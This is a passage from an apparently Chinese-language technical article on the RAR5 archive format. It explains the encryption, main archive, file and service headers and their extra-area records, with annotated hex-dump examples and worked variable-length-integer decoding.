style="text-align:left"><code>加密算法的版本</code>。现在仅支持0版本(AES-256)。</td></tr><tr><td style="text-align:left">Encryption flags</td><td style="text-align:center">vint</td><td style="text-align:left"><code>0x00</code> - 不存在密码检查数据(Check value字段)。 <br> <code>0x01</code> - 存在密码检查数据(Check value字段)。</td></tr><tr><td style="text-align:left">KDF count</td><td style="text-align:center">1 byte</td><td style="text-align:left"><code>PBKDF2函数</code>的<code>迭代数</code>的<code>二进制对数</code>。 RAR可以拒绝处理<code>超过</code>某个阈值的KDF计数。阈值的具体值取决于<code>版本</code>。</td></tr><tr><td style="text-align:left">Salt</td><td style="text-align:center">16 byte</td><td style="text-align:left">全局地用于<code>所有加密</code>的压缩文档头的盐值。</td></tr><tr><td style="text-align:left">Check value</td><td style="text-align:center">12 byte</td><td style="text-align:left">用于<code>验证密码有效性</code>的值。仅当设置了<code>0x01</code>加密标志时才存在。<code>前8个字节</code>是使用额外的PBKDF2轮次计算的，<code>最后4个字节</code>是额外的校验和。与标准<code>Header CRC32</code>一起，我们具有<code>64位校验和</code>，以可靠地<code>验证此字段的完整性</code>并区分<code>无效的密码</code>和<code>损坏的数据</code>。可以在UnRAR源代码中找到更多详细信息。</td></tr></tbody></table><p>&emsp;&emsp;This header is present only in archives with encrypted headers. Every next header after this one is started from 16 byte AES-256 initialization vector followed by encrypted header data. Size of encrypted header data block is aligned to 16 byte boundary.<br>&emsp;&emsp;该头仅存在于<code>带有加密头</code>的压缩文档中。此后的<code>每下一个头</code>均从16字节<code>AES-256初始化向量</code>开始，然后是<code>加密的头数据</code>。加密头数据块的大小与16字节边界对齐。</p><p><strong><code>实例：</code></strong><br>这是设置密码时勾选了<code>加密文件名</code>后，出现的块。<br><img src="/resources/2020/RAR_Format/Archive encryption header.jpg" alt="压缩文档加密块"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">00000000 - 00310783 SFX(自解压模块)</span><br><span class="line"></span><br><span class="line">00310784 - 00310791</span><br><span class="line">52 61 72 21 1A 07 01 00</span><br><span class="line"></span><br><span class="line">00310792 - 00310829</span><br><span class="line">49 23 54 91 - Header CRC32( Header size -&gt; Check value )</span><br><span class="line">21 - Header size( Header <span class="built_in">type</span> -&gt; Check value ) 21H = 33D</span><br><span class="line">04 - Header <span class="built_in">type</span>( 压缩文档加密块 )</span><br><span class="line">00 - Header flags</span><br><span class="line">00 - Encryption version</span><br><span class="line">01 - Encryption flags</span><br><span class="line">0F - KDF count</span><br><span class="line">89 54 B1 34 4A 94 3D 09 FA 1A CB 8A C8 A9 F3 A3 - Salt</span><br><span class="line">21 43 42 86 61 24 8A 16 E4 1B C8 8E - Check value</span><br></pre></td></tr></table></figure><h5 id="2-2-3-4、Main-archive-header-压缩文件头"><a href="#2-2-3-4、Main-archive-header-压缩文件头" class="headerlink" title="2.2.3.4、Main archive header(压缩文件头)"></a>2.2.3.4、<strong><code>Main archive header(压缩文件头)</code></strong></h5><table><thead><tr><th style="text-align:left">字段名称</th><th style="text-align:center">大小(类型)</th><th style="text-align:left">说明</th></tr></thead><tbody><tr><td style="text-align:left">Header CRC32</td><td style="text-align:center">uint32</td><td style="text-align:left">头数据的CRC32，从“<code>Header size</code>”字段开始，直至“<code>Extra area</code>”字段。</td></tr><tr><td style="text-align:left">Header size</td><td style="text-align:center">vint</td><td style="text-align:left">头数据的大小，从“<code>Header type</code>”字段开始，直至“<code>Extra area</code>”字段。</td></tr><tr><td style="text-align:left">Header type</td><td style="text-align:center">vint</td><td style="text-align:left"><code>0x01</code></td></tr><tr><td style="text-align:left">Header flags</td><td style="text-align:center">vint</td><td style="text-align:left">所有头共有的标志：<br> <code>0x01</code> - 头末尾存在扩展区域。<br> <code>0x02</code> - 头末尾存在数据区域。<br> <code>0x04</code> - 当更新压缩文档时，必须跳过类型未知并拥有该标志的块。<br> <code>0x08</code> - 数据区域从上一卷继续。<br> <code>0x10</code> - 数据区域从下一卷继续。<br> <code>0x20</code> - 块取决于前一个文件块。<br> <code>0x40</code> - 如果修改了主块，则保留一个子块。</td></tr><tr><td style="text-align:left">Extra area size</td><td style="text-align:center">vint</td><td style="text-align:left"><code>可选字段</code>，扩展区域的大小。仅当设置了<code>0x01</code>头标志时才存在。</td></tr><tr><td style="text-align:left">Archive flags</td><td style="text-align:center">vint</td><td style="text-align:left"><code>0x01</code> - 卷。压缩文档是多卷集的一部分。 <br> <code>0x02</code> - “Volume number”字段存在。除第一卷外，所有的卷都存在此标志。 <br> <code>0x04</code> - 可靠的压缩文档。 <br> <code>0x08</code> - 存在恢复记录。 <br> <code>0x10</code> - 压缩文档已锁定。</td></tr><tr><td style="text-align:left">Volume number</td><td style="text-align:center">vint</td><td style="text-align:left"><code>可选字段</code>，仅当设置了Archive flags的<code>0x02</code>位时才显示。第一卷不存在，第二卷为1，第三卷为2，依此类推。</td></tr><tr><td style="text-align:left">Extra area</td><td style="text-align:center">…</td><td style="text-align:left"><code>可选字段</code>，扩展区域。仅当设置了<code>0x01</code>头标志时才存在。</td></tr></tbody></table><p>Extra area of main archive header can contain following record types：<br><code>压缩文件头</code>的<code>扩展区域</code>可以包含以下记录类型：</p><table><thead><tr><th style="text-align:left">类型编号</th><th style="text-align:left">类型名称</th><th style="text-align:left">说明</th></tr></thead><tbody><tr><td style="text-align:left">0x01</td><td style="text-align:left">Locator</td><td style="text-align:left">包含<code>不同服务块</code>的位置，因此可以<code>快速访问</code>它们，而无需扫描整个压缩文档。该记录是<code>可选的</code>。如果缺少它，仍然有必要扫描<code>整个压缩文件</code>以验证服务块的存在。</td></tr></tbody></table><p><strong><code>Locator record(定位记录)</code></strong></p><table><thead><tr><th style="text-align:left">字段名称</th><th style="text-align:center">大小(类型)</th><th style="text-align:left">说明</th></tr></thead><tbody><tr><td style="text-align:left">Size</td><td style="text-align:center">vint</td><td style="text-align:left">从Type开始的记录数据的大小。</td></tr><tr><td style="text-align:left">Type</td><td style="text-align:center">vint</td><td style="text-align:left"><code>0x01</code></td></tr><tr><td style="text-align:left">Flags</td><td style="text-align:center">vint</td><td style="text-align:left"><code>0x01</code> - “Quick open record offset”字段存在。 <br> <code>0x02</code> - “Recovery record offset”字段存在。</td></tr><tr><td style="text-align:left">Quick open offset</td><td style="text-align:center">vint</td><td style="text-align:left"><code>可选字段</code>，从<code>“Quick open”服务块的开始</code>到<code>Main archive header的开始</code>的距离。仅当设置了<code>0x01</code>标志时才存在。如果等于0，则应忽略。如果预分配的空间不足以存储产生的偏移量，则可以将其设置为零。</td></tr><tr><td style="text-align:left">Recovery record offset</td><td style="text-align:center">vint</td><td style="text-align:left"><code>可选字段</code>，从<code>“Recovery record”服务块的开始</code>到<code>Main archive header的开始</code>的距离。仅当设置了<code>0x02</code>标志时才存在。如果等于0，则应忽略。如果预分配的空间不足以存储产生的偏移量，则可以将其设置为零。</td></tr></tbody></table><p><strong><code>实例：</code></strong><br><img src="/resources/2020/RAR_Format/Main archive header.jpg" alt="压缩文件头"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">00310792 - 00310811</span><br><span class="line">49 64 D1 32 - Header CRC32( Header size -&gt; Extra area )</span><br><span class="line">0F - Header size( Header <span class="built_in">type</span> -&gt; Extra area ) 0FH = 15D</span><br><span class="line">01 - Header <span class="built_in">type</span>( 压缩文件头 )</span><br><span class="line">05 - Header flags( 0x05 = 0x01 + 0x04 )</span><br><span class="line">0B - Extra area size( 0BH = 11D )</span><br><span class="line">18 - Archive flags( 0x18 = 0x10 + 0x08 )</span><br><span class="line">0A - Size[ Extra area ] 0AH = 10D</span><br><span class="line">01 - Type( Locator record )</span><br><span class="line">03 - Flags( 0x03 = 0x01 + 0x02 )</span><br><span class="line">A3 C7 81 00 - Quick open offset</span><br><span class="line">DB C8 81 00 - Recovery record offset</span><br><span class="line">---------------------------------------------------------------</span><br><span class="line">Note: vint类型的数据，如果是多字节的，前几个字节的最高位为连续标志</span><br><span class="line">(设为1)，低7位为数据，最后一个字节的最高位为0，低7位依旧是数据。所</span><br><span class="line">以我们需要提取出数据，进行重新组合，才能得到“Quick open header”</span><br><span class="line">和“Recovery record”真实偏移。</span><br><span class="line">1、Quick open offset</span><br><span class="line">0x0081C7A3( 00000000 10000001 ‭11000111‬ ‭10100011 ‬)</span><br><span class="line">0000001 1000111‬ 0100011‬B = 01100011 1‬0100011‬B = 63A3H = ‭25507‬D</span><br><span class="line">310792 + 25507 = 336299</span><br><span class="line">2、Recovery record offset</span><br><span class="line">0x0081C8DB( ‭00000000 10000001 11001000 11011011 ‬)</span><br><span class="line">0000001 1001000 1011011‬B = 01100100 01011011‬B = 645BH = ‭25691‬D</span><br><span class="line">310792 + ‭25691‬ = ‭336483‬</span><br><span class="line">---------------------------------------------------------------</span><br></pre></td></tr></table></figure><h5 id="2-2-3-5、File-header-and-service-header-文件头和服务头"><a href="#2-2-3-5、File-header-and-service-header-文件头和服务头" class="headerlink" title="2.2.3.5、File header and service header(文件头和服务头)"></a>2.2.3.5、<strong><code>File header and service header(文件头和服务头)</code></strong></h5><p>&emsp;&emsp;These two header types use the similar data structure, so we describe them both here.<br>&emsp;&emsp;这两种头类型使用相似的数据结构，因此我们在这里对它们一起进行描述。</p><table><thead><tr><th style="text-align:left">字段名称</th><th style="text-align:center">大小(类型)</th><th style="text-align:left">说明</th></tr></thead><tbody><tr><td style="text-align:left">Header CRC32</td><td style="text-align:center">uint32</td><td style="text-align:left">头数据的CRC32，从“<code>Header size</code>”字段开始，直至“<code>Name</code>”字段。</td></tr><tr><td style="text-align:left">Header size</td><td style="text-align:center">vint</td><td style="text-align:left">头数据的大小，从“<code>Header type</code>”字段开始，直至“<code>Name</code>”字段。</td></tr><tr><td style="text-align:left">Header type</td><td style="text-align:center">vint</td><td style="text-align:left"><code>0x02</code> - 文件头 <br> <code>0x03</code> - 服务头</td></tr><tr><td style="text-align:left">Header flags</td><td style="text-align:center">vint</td><td style="text-align:left">所有头共有的标志：<br> <code>0x01</code> - 头末尾存在扩展区域。<br> <code>0x02</code> - 头末尾存在数据区域。<br> <code>0x04</code> - 当更新压缩文档时，必须跳过类型未知并拥有该标志的块。<br> <code>0x08</code> - 数据区域从上一卷继续。<br> <code>0x10</code> - 数据区域从下一卷继续。<br> <code>0x20</code> - 块取决于前一个文件块。<br> <code>0x40</code> - 如果修改了主块，则保留一个子块。</td></tr><tr><td style="text-align:left">Extra area size</td><td style="text-align:center">vint</td><td style="text-align:left"><code>可选字段</code>，扩展区域的大小。仅当设置了<code>0x01</code>头标志时才存在。</td></tr><tr><td style="text-align:left">Data area size</td><td style="text-align:center">vint</td><td style="text-align:left"><code>可选字段</code>，数据区域的大小。仅当设置了<code>0x02</code>头标志时才存在。</td></tr><tr><td style="text-align:left">File flags</td><td style="text-align:center">vint</td><td style="text-align:left">这些头类型专用的标志：<br> &emsp;&emsp;<code>0x01</code> - 目录文件系统对象(文件头)。<br> &emsp;&emsp;<code>0x02</code> - 存在Unix格式的时间字段。<br> &emsp;&emsp;<code>0x04</code> - 存在CRC32字段。<br> &emsp;&emsp;<code>0x08</code> - 解压后大小未知。<br> 如果设置了标志<code>0x08</code>，则“<code>Unpacked size</code>”字段仍然存在，但是必须忽略，并且必须执行提取，直到到达压缩流的末尾。如果实际文件大小大于操作系统报告的大小，或者文件大小未知（例如，除从stdin到multivolume archive归档时的最后一个卷以外的所有卷），则可以设置此标志。</td></tr><tr><td style="text-align:left">Unpacked size</td><td style="text-align:center">vint</td><td style="text-align:left">解压缩的<code>文件</code>或<code>服务数据</code>大小。</td></tr><tr><td style="text-align:left">Attributes</td><td style="text-align:center">vint</td><td style="text-align:left">如果是<code>文件头</code>，则为操作系统特定的文件属性。如果是<code>服务头</code>，可以用于特定数据需求，也可以保留，并可以设置为0。</td></tr><tr><td style="text-align:left">mtime</td><td style="text-align:center">uint32</td><td style="text-align:left"><code>可选字段</code>，Unix时间格式的<code>文件修改时间</code>。如果设置了<code>0x02</code>文件标志，则存在。</td></tr><tr><td style="text-align:left">Data CRC32</td><td style="text-align:center">uint32</td><td style="text-align:left"><code>可选字段</code>，已解压缩的<code>文件</code>或<code>服务数据</code>的CRC32。对于在卷之间分割的文件，它包含当前卷中除最后文件部分以外的所有文件部分所包含的文件打包数据的CRC32。如果设置了<code>0x04</code>文件标志，则存在。</td></tr><tr><td style="text-align:left">Compression information</td><td style="text-align:center">vint</td><td style="text-align:left"><code>低6位(0x003f)</code>：压缩算法的版本，可能有0-63个值。当前版本是0。<br> <code>第7位(0x0040)</code>：定义solid flag。如果已设置，RAR将在处理之前的文件后继续使用剩下的压缩字典。只能为文件头设置，而不能为服务头设置。<br> <code>第8-10位(0x0380)</code>：定义压缩方法。当前仅使用值0-5。<br> &emsp;&emsp;10 9 8 位<br> &emsp;&emsp;<code>0 0 0</code> - 存储 <br> &emsp;&emsp;<code>0 0 1</code> - 最快压缩 <br> &emsp;&emsp;<code>0 1 0</code> - 较快压缩 <br> &emsp;&emsp;<code>0 1 1</code> - 标准压缩 <br> &emsp;&emsp;<code>1 0 0</code> - 较好压缩 <br> &emsp;&emsp;<code>1 0 1</code> - 最好压缩<br> <code>第11-14位(0x3c00)</code>：定义提取数据所需的字典大小的最小大小。<br> &emsp;&emsp;14 13 12 11 位<br> &emsp;&emsp;<code>0 0 0 0</code> - 字典大小 128KB<br> &emsp;&emsp;<code>0 0 0 1</code> - 字典大小 256KB<br> &emsp;&emsp;<code>0 0 1 0</code> - 字典大小 512KB<br> &emsp;&emsp;<code>0 0 1 1</code> - 字典大小 1MB<br> &emsp;&emsp;<code>0 1 0 0</code> - 字典大小 2MB<br> &emsp;&emsp;<code>0 1 0 1</code> - 字典大小 4MB<br> &emsp;&emsp;<code>0 1 1 0</code> - 字典大小 8MB<br> &emsp;&emsp;<code>0 1 1 1</code> - 字典大小 16MB<br> &emsp;&emsp;<code>1 0 0 0</code> - 字典大小 32MB<br> &emsp;&emsp;<code>1 0 0 1</code> - 字典大小 64MB<br> &emsp;&emsp;<code>1 0 1 0</code> - 字典大小 128MB<br> &emsp;&emsp;<code>1 0 1 1</code> - 字典大小 256MB<br> &emsp;&emsp;<code>1 1 0 0</code> - 字典大小 512MB<br> &emsp;&emsp;<code>1 1 0 1</code> - 字典大小 1024MB<br> &emsp;&emsp;<code>1 1 1 0</code> - 字典大小 2048MB<br> &emsp;&emsp;<code>1 1 1 1</code> - 字典大小 4096MB</td></tr><tr><td style="text-align:left">Host OS</td><td style="text-align:center">vint</td><td style="text-align:left">用于创建压缩文档的操作系统的类型： <br> <code>0x00</code> - Windows <br> <code>0x01</code> - Unix</td></tr><tr><td style="text-align:left">Name length</td><td style="text-align:center">vint</td><td style="text-align:left"><code>文件</code>或<code>服务头</code>名称的长度。</td></tr><tr><td style="text-align:left">Name</td><td style="text-align:center">N bytes</td><td style="text-align:left">1、可变长度字段，包含UTF-8格式的名称，不以0结尾。<br> 2、对于<code>文件头</code>，这是已压缩文件的名称。正斜杠字符用作Unix和Windows名称的路径分隔符。对于Unix文件名称，反斜杠被视为名称的一部分，对于Windows文件名称，反斜杠被视为无效字符。名称类型由“Host OS”字段定义。<br> 3、如果Unix文件名包含无法正确转换为Unicode和UTF-8的任何高级ASCII字符，我们会将这些字符映射到0xE080-0xE0FF私有Unicode区域，并在结果字符串中插入Unicode非字符0xFFFE以表明它包含已映射字符，提取时需要转换回去。没有定义0xFFFE的具体位置，我们需要搜索整个字符串。此类映射的名称不可移植，并且只能在创建它们的同一系统上正确解压缩。<br> 4、对于<code>服务头</code>，此字段包含服务头的名称。现在使用以下名称：<br> <code>CMT</code> - 压缩文档注释 <br> <code>QO</code> - 压缩文档Quick open数据 <br> <code>ACL</code> - NTFS文件权限 <br> <code>STM</code> - NTFS交换数据流 <br> <code>RR</code> - 恢复记录</td></tr><tr><td style="text-align:left">Extra area</td><td style="text-align:center">…</td><td style="text-align:left"><code>可选字段</code>，扩展区域，包含附加的头字段。仅当设置了<code>0x01</code>头标志时才存在。</td></tr><tr><td style="text-align:left">Data area</td><td style="text-align:center">vint</td><td style="text-align:left"><code>可选字段</code>，数据区域，仅当设置了<code>0x02</code>头标志时才存在。如果是<code>文件头</code>，则存储文件数据；对于<code>服务头</code>，则存储服务数据。根据压缩方法中的值，可以对压缩信息进行未压缩（压缩方法0）或压缩。</td></tr></tbody></table><p>File and service headers use the same types of extra area records:<br><code>文件头</code>和<code>服务头</code>使用相同类型的扩展区域记录类型：</p><table><thead><tr><th style="text-align:left">类型</th><th style="text-align:left">类型名称</th><th style="text-align:left">说明</th></tr></thead><tbody><tr><td style="text-align:left">0x01</td><td style="text-align:left">File encryption</td><td style="text-align:left">文件加密信息。</td></tr><tr><td style="text-align:left">0x02</td><td style="text-align:left">File hash</td><td style="text-align:left">文件数据哈希。</td></tr><tr><td style="text-align:left">0x03</td><td style="text-align:left">File time</td><td style="text-align:left">高精度文件时间。</td></tr><tr><td style="text-align:left">0x04</td><td style="text-align:left">File version</td><td style="text-align:left">文件版本号。</td></tr><tr><td style="text-align:left">0x05</td><td style="text-align:left">Redirection</td><td style="text-align:left">文件系统重定向。</td></tr><tr><td style="text-align:left">0x06</td><td style="text-align:left">Unix owner</td><td style="text-align:left">Unix所有者和组信息。</td></tr><tr><td style="text-align:left">0x07</td><td style="text-align:left">Service data</td><td style="text-align:left">服务头数据数组。</td></tr></tbody></table><p><strong><code>File encryption record(文件加密记录)</code></strong><br>This record is present if file data is encrypted.<br>如果<code>文件数据被加密</code>，则存在该记录。</p><table><thead><tr><th style="text-align:left">字段名称</th><th style="text-align:center">大小(类型)</th><th style="text-align:left">说明</th></tr></thead><tbody><tr><td style="text-align:left">Size</td><td style="text-align:center">vint</td><td style="text-align:left">从Type开始的记录数据的大小。</td></tr><tr><td style="text-align:left">Type</td><td style="text-align:center">vint</td><td style="text-align:left"><code>0x01</code></td></tr><tr><td style="text-align:left">Version</td><td style="text-align:center">vint</td><td style="text-align:left">加密算法的版本。现在仅支持<code>0版本</code>(AES-256)。</td></tr><tr><td style="text-align:left">Flags</td><td style="text-align:center">vint</td><td style="text-align:left"><code>0x01</code> - 存在密码验证数据。<br> <code>0x02</code> - 使用调整过的校验和而不是普通校验和。<br> 如果存在标志<code>0x02</code>，则RAR转换保留的校验和文件或服务数据的完整性，因此它取决于加密密钥。它使得不可能根据校验和猜测文件内容。它会影响文件头中的数据CRC32和扩展区域中文件哈希记录中的校验和。</td></tr><tr><td style="text-align:left">KDF count</td><td style="text-align:center">1 byte</td><td style="text-align:left"><code>PBKDF2函数</code>的迭代数的<code>二进制对数</code>。 RAR可以拒绝处理超过<code>某个阈值</code>的KDF计数。阈值的具体值取决于<code>版本</code>。</td></tr><tr><td style="text-align:left">Salt</td><td style="text-align:center">16 byte</td><td style="text-align:left">设置加密文件<code>解密密钥</code>的盐值。</td></tr><tr><td style="text-align:left">IV</td><td style="text-align:center">16 byte</td><td style="text-align:left">AES-256<code>初始化向量</code>。</td></tr><tr><td style="text-align:left">Check value</td><td style="text-align:center">12 byte</td><td style="text-align:left"><code>可选字段</code>，用于验证密码有效性的值。仅当设置了<code>0x01</code>加密标志时才存在。<code>前8个字节</code>是使用额外的PBKDF2轮次计算的，<code>最后4个字节</code>是额外的校验和。与标准<code>Header CRC32</code>一起，我们具有<code>64位校验和</code>，以可靠地<code>验证此字段的完整性</code>并区分<code>无效的密码</code>和<code>损坏的数据</code>。可以在UnRAR源代码中找到更多详细信息。</td></tr></tbody></table><p><strong><code>File hash record(文件哈希记录)</code></strong><br>&emsp;&emsp;Only the standard CRC32 checksum can be stored directly in file header. If other hash is used, it is stored in this extra area record:<br>&emsp;&emsp;仅<code>标准CRC32校验和</code>可以直接存储在<code>文件头</code>中。如果使用<code>其他哈希</code>，它将存储在此<code>扩展区域记录</code>中：</p><table><thead><tr><th style="text-align:left">字段名称</th><th style="text-align:center">大小(类型)</th><th style="text-align:left">说明</th></tr></thead><tbody><tr><td style="text-align:left">Size</td><td style="text-align:center">vint</td><td style="text-align:left">从Type开始的记录数据的大小。</td></tr><tr><td style="text-align:left">Type</td><td style="text-align:center">vint</td><td style="text-align:left"><code>0x02</code></td></tr><tr><td style="text-align:left">Hash type</td><td style="text-align:center">vint</td><td style="text-align:left"><code>0x00</code> - BLAKE2sp哈希函数。</td></tr><tr><td style="text-align:left">Hash data</td><td style="text-align:center">N bytes</td><td style="text-align:left"><code>0x00哈希类型</code>的32个字节的BLAKE2sp哈希值。</td></tr></tbody></table><p>&emsp;&emsp;For files split between volumes it contains a hash of file packed data contained in current volume for all file parts except the last. For files not split between volumes and for last parts of split files it contains an unpacked data hash.<br>&emsp;&emsp;对于<code>在卷之间分割</code>的文件，它包含当前卷中除最后文件部分以外的所有文件部分所包含的文件压缩数据的哈希。对于<code>未在卷之间拆分</code>的文件以及拆分文件的最后部分，它包含未压缩的数据哈希。</p><p><strong><code>File time record(文件时间记录)</code></strong><br>&emsp;&emsp;This record is used if it is necessary to store creation and last access time or if 1 second precision of Unix mtime stored in file header is not enough:<br>&emsp;&emsp;如果需要存储<code>创建</code>和<code>上次访问</code>时间，或者<code>文件头</code>中存储的Unix mtime的1秒<code>精度不够</code>，则使用此记录：</p><table><thead><tr><th style="text-align:left">字段名称</th><th style="text-align:center">大小(类型)</th><th style="text-align:left">说明</th></tr></thead><tbody><tr><td style="text-align:left">Size</td><td style="text-align:center">vint</td><td style="text-align:left">从Type开始的记录数据的大小。</td></tr><tr><td style="text-align:left">Type</td><td style="text-align:center">vint</td><td style="text-align:left"><code>0x03</code></td></tr><tr><td style="text-align:left">Flags</td><td style="text-align:center">vint</td><td style="text-align:left"><code>0x01</code> - 如果设置了此标志，则时间以Unix time_t格式存储，否则以Windows FILETIME格式存储。<br> <code>0x02</code> - 存在“mtime”字段。<br> <code>0x04</code> - 存在“ctime”字段。<br> <code>0x08</code> - 存在“atime”字段。<br> <code>0x10</code> - Unix时间格式，具有纳秒级精度。</td></tr><tr><td style="text-align:left">mtime</td><td style="text-align:center">uint32 or uint64</td><td style="text-align:left"><code>修改时间</code>。如果设置了<code>0x02</code>标志，则存在。根据<code>0x01</code>，标志可以采用Unix time_t或Windows FILETIME格式。</td></tr><tr><td style="text-align:left">ctime</td><td style="text-align:center">uint32 or uint64</td><td style="text-align:left"><code>创建时间</code>。如果设置了<code>0x04</code>标志，则存在。根据<code>0x01</code>，标志可以采用Unix time_t或Windows FILETIME格式。</td></tr><tr><td style="text-align:left">atime</td><td style="text-align:center">uint32 or uint64</td><td style="text-align:left"><code>上次访问时间</code>。如果设置了<code>0x08</code>标志，则存在。根据<code>0x01</code>，标志可以采用Unix time_t或Windows FILETIME格式。</td></tr><tr><td style="text-align:left">mtime nanoseconds</td><td style="text-align:center">uint32</td><td style="text-align:left">添加到<code>mtime</code>的纳秒值。如果<code>0x01</code>、<code>0x02</code>和<code>0x10</code>标志都设置了，则存在。</td></tr><tr><td style="text-align:left">ctime nanoseconds</td><td style="text-align:center">uint32</td><td style="text-align:left">添加到<code>ctime</code>的纳秒值。如果<code>0x01</code>、<code>0x04</code>和<code>0x10</code>标志都设置了，则存在。</td></tr><tr><td style="text-align:left">atime nanoseconds</td><td style="text-align:center">uint32</td><td style="text-align:left">添加到<code>atime</code>的纳秒值。如果<code>0x01</code>、<code>0x08</code>和<code>0x10</code>标志都设置了，则存在。</td></tr></tbody></table><p><strong><code>File version record(文件版本记录)</code></strong><br>This record is used in archives created with -ver switch.<br>该记录用于通过<code>-ver开关</code>创建的压缩文档中。</p><table><thead><tr><th style="text-align:left">字段名称</th><th style="text-align:center">大小(类型)</th><th style="text-align:left">说明</th></tr></thead><tbody><tr><td style="text-align:left">Size</td><td style="text-align:center">vint</td><td style="text-align:left">从Type开始的记录数据的大小。</td></tr><tr><td style="text-align:left">Type</td><td style="text-align:center">vint</td><td style="text-align:left"><code>0x04</code></td></tr><tr><td style="text-align:left">Flags</td><td style="text-align:center">vint</td><td style="text-align:left">尚未定义文件版本标志，因此将其设置为0。</td></tr><tr><td style="text-align:left">Version number</td><td style="text-align:center">vint</td><td style="text-align:left">文件版本号。</td></tr></tbody></table><p><strong><code>File system redirection record(文件系统重定向记录)</code></strong></p><table><thead><tr><th style="text-align:left">字段名称</th><th style="text-align:center">大小(类型)</th><th style="text-align:left">说明</th></tr></thead><tbody><tr><td style="text-align:left">Size</td><td style="text-align:center">vint</td><td style="text-align:left">从Type开始的记录数据的大小。</td></tr><tr><td style="text-align:left">Type</td><td style="text-align:center">vint</td><td style="text-align:left"><code>0x05</code></td></tr><tr><td style="text-align:left">Redirection type</td><td style="text-align:center">vint</td><td style="text-align:left"><code>0x01</code> - Unix符号链接 <br> <code>0x02</code> - Windows符号链接 <br> <code>0x03</code> - Windows交接点 <br> <code>0x04</code> - 硬链接 <br> <code>0x05</code> - 文件复制</td></tr><tr><td style="text-align:left">Flags</td><td style="text-align:center">vint</td><td style="text-align:left"><code>0x01</code> - 链接目标为目录</td></tr><tr><td style="text-align:left">Name length</td><td style="text-align:center">vint</td><td style="text-align:left">链接目标名称的长度</td></tr><tr><td style="text-align:left">Name</td><td style="text-align:center">vint</td><td style="text-align:left"><code>UTF-8</code>格式的链接目标名称，不以0结尾</td></tr></tbody></table><p><strong><code>Unix owner record(Unix所有者记录)</code></strong></p><table><thead><tr><th style="text-align:left">字段名称</th><th style="text-align:center">大小(类型)</th><th style="text-align:left">说明</th></tr></thead><tbody><tr><td style="text-align:left">Size</td><td style="text-align:center">vint</td><td style="text-align:left">从Type开始的记录数据的大小。</td></tr><tr><td style="text-align:left">Type</td><td style="text-align:center">vint</td><td style="text-align:left"><code>0x06</code></td></tr><tr><td style="text-align:left">Flags</td><td style="text-align:center">vint</td><td style="text-align:left"><code>0x01</code> - “User name”符串存在 <br> <code>0x02</code> - “Group name”字符串存在 <br> <code>0x04</code> - 存在数字“User ID” <br> <code>0x08</code> - 存在数字“Group ID”</td></tr><tr><td style="text-align:left">User name length</td><td style="text-align:center">vint</td><td style="text-align:left"><code>可选字段</code>，所有者用户名的长度。如果设置了<code>0x01</code>标志，则存在。</td></tr><tr><td style="text-align:left">User name</td><td style="text-align:center">N bytes</td><td style="text-align:left"><code>可选字段</code>，所有者用户名（采用本机编码）。非零终止。如果设置了<code>0x01</code>标志，则存在。</td></tr><tr><td style="text-align:left">Group name length</td><td style="text-align:center">vint</td><td style="text-align:left"><code>可选字段</code>，所有者组名称的长度。如果设置了<code>0x02</code>标志，则存在。</td></tr><tr><td style="text-align:left">Group name</td><td style="text-align:center">N bytes</td><td style="text-align:left"><code>可选字段</code>，所有者组名称（采用本机编码）。非零终止。如果设置了<code>0x02</code>标志，则存在。</td></tr><tr><td style="text-align:left">User ID</td><td style="text-align:center">vint</td><td style="text-align:left"><code>可选字段</code>，数字所有者用户ID。如果设置了<code>0x04</code>标志，则存在。</td></tr><tr><td style="text-align:left">Group ID</td><td style="text-align:center">vint</td><td style="text-align:left"><code>可选字段</code>，数字所有者组ID。如果设置了<code>0x08</code>标志，则存在。</td></tr></tbody></table><p><strong><code>Service data record(服务数据记录)</code></strong><br>This record is used only by service headers to store additional parameters.<br>该记录仅由<code>服务头</code>使用，以存储其他参数。</p><table><thead><tr><th style="text-align:left">字段名称</th><th style="text-align:center">大小(类型)</th><th style="text-align:left">说明</th></tr></thead><tbody><tr><td style="text-align:left">Size</td><td style="text-align:center">vint</td><td style="text-align:left">从Type开始的记录数据的大小。</td></tr><tr><td style="text-align:left">Type</td><td style="text-align:center">vint</td><td style="text-align:left"><code>0x07</code></td></tr><tr><td style="text-align:left">Data</td><td style="text-align:center">N bytes</td><td style="text-align:left">服务数据的具体内容取决于<code>服务头类型</code>。</td></tr></tbody></table><p><strong><code>实例：</code></strong><br><img src="/resources/2020/RAR_Format/File header.jpg" alt="文件头"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span 